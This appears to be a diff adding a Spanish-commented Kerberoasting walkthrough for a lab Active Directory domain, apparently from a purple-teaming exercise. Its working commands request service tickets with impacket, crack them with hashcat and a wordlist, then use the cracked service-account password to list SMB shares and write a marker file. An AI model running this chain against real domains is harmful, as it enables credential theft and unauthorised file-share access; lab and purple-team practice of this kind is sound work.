@@ -1,0 +1,20 @@
+# 1. Obtener Ticket TGS
+impacket-GetUserSPNs lab.local/testuser:'Monkey123!' -dc-ip 192.168.1.10 -request -outputfile hash.txt
+
+# 2. Descifrar Hashes
+hashcat -m 13100 -a 0 hash.txt /home/kali/rockyou.txt -r /usr/share/hashcat/rules/best66.rule 
+
+# 3. acceder a la información
+netexec smb 192.168.1.10 -u svc_sql -p 'Password123!' --shares
+
+# 4. Crear archivo 
+echo "Purple Teaming Simulation - Access Achieved via Kerberoasting" > pwned.txt
+
+# 5. Acceder mediante contraseña
+impacket-smbclient lab.local/svc_sql:'Password123!'@192.168.1.10  
+
+# 6. Acceder a share con permisos de escritura
+use LabShares
+
+# 7. Meter archivo
+put pwned.txt
